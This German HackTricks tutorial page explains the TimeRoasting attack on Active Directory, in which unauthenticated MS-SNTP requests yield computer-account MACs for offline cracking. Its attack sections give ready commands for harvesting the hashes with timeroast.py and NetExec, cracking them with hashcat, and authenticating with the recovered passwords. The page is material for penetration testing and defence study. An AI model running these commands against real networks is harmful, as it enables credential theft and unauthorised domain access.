# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting missbraucht die Legacy-Authentifizierung von MS-SNTP. Ein nicht authentifizierter Client kann eine 68-Byte-Anfrage senden, die eine ausgewählte RID eines Computerkontos enthält. Beim ausnutzbaren Legacy-Pfad leitet der Domain Controller den Antwort-Authenticator über Netlogon unter Verwendung des NT-Hash des Computerkontos ab (das aus MD4 abgeleitete Passwortgeheimnis), wodurch der Angreifer ein Challenge/MAC-Paar erhält, das sich für das Offline-Raten von Passwörtern eignet (Hashcat-Modus 31300).<sup>[[1]](#references)[[2]](#references)</sup>

Die Abschnitte 3.1.5.1 und 4 von MS-SNTP beschreiben das Verhalten von Anfrage und Antwort:<sup>[[1]](#references)</sup>
![TimeRoasting: Siehe Abschnitt 3.1.5.1 „Authentication Request Behavior“ und 4 „Protocol Examples“ in der offiziellen MS-SNTP-Spezifikation für weitere Details](../../images/Pasted%20image%2020250709114508.png)
Wenn `ExtendedAuthenticatorSupported` false ist, speichert die Anfrage die RID in den unteren 31 Bits des Key Identifier des Authenticators sowie ein Auswahlbit im höchsten Bit. Der Server überprüft die Länge von 68 Bytes, extrahiert die RID, fordert Netlogon auf, die möglichen Checksumme zu berechnen, wählt anhand dieses höchsten Bits eine davon aus, setzt den Key Identifier der Antwort auf null und gibt die ausgewählte Checksumme zurück.<sup>[[1]](#references)</sup>

Die Crypto-Checksumme basiert auf MD5 (siehe 3.2.5.1.1) und kann offline geknackt werden, wodurch der Roasting-Angriff ermöglicht wird.<sup>[[1]](#references)</sup>

## Angriff durchführen

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting-Skripte von Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Praktischer Angriff (unauth) mit NetExec + Hashcat

- Das `timeroast`-Modul von NetExec kann Computer-RIDs enumerieren, MS-SNTP-MACs ohne Authentifizierung sammeln und zum Cracken bereite `$sntp-ms$`-Hashes ausgeben:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Offline mit Hashcat mode 31300 (MS-SNTP MAC) knacken:<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Der wiederhergestellte Klartext entspricht dem Passwort eines Computerkontos. Versuche es direkt als Computerkonto mit Kerberos (-k), wenn NTLM deaktiviert ist:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### Betriebliche Hinweise
- Stelle vor der Verwendung wiederhergestellter Zugangsdaten mit Kerberos eine genaue Zeit sicher. Bevorzuge einen gepflegten NTP-Client wie `chronyd`/`systemd-timesyncd`; `ntpdate` wird hier als gängiger Lab-Befehl beibehalten: `sudo ntpdate <dc_fqdn>`.
- Falls erforderlich, generiere eine krb5.conf für die AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Ordne RIDs später über LDAP/BloodHound Principals zu, sobald du einen authentifizierten foothold hast.

## References

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting-Whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – Quellcode des `timeroast`-Moduls](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Hashcat-Modus 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
